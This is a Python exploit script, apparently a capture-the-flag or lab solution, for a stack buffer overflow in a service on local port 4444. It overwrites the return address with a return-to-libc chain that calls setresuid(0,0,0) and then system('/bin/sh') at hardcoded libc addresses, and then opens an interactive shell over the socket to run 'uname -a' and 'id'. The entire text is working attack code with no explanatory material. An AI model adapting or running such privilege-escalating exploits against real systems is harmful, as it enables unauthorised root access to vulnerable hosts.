#!/usr/bin/env python3
import socket
import struct
from telnetlib import Telnet

HOST = "127.0.0.1"
PORT = 4444

buf = b'A'*76

buf += struct.pack("<I", 0xb7ecb660)  # setresuid libc addr
buf += struct.pack("<I", 0x080485d9)  # pppr gadget
buf += struct.pack("<I", 0)  # ruid arg
buf += struct.pack("<I", 0)  # euid arg
buf += struct.pack("<I", 0)  # suid arg

buf += struct.pack("<I", 0xb7e54db0)  # system libc addr
buf += b'AAAA'  # random ret addr
buf += struct.pack("<I", 0xb7f75b0b)  # "/bin/sh" string addr

buf += b'\n'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

print(s.recv(1024))  # regular output
s.send(buf)
print(s.recv(1024))  # regular output

t = Telnet()
t.sock = s
t.write(b'uname -a\n')
t.write(b'id\n')
try:
    t.interact()
except UnicodeDecodeError:
    print("decode_error")
    print(s.recv(1024).decode("utf-8"))
    t.interact()
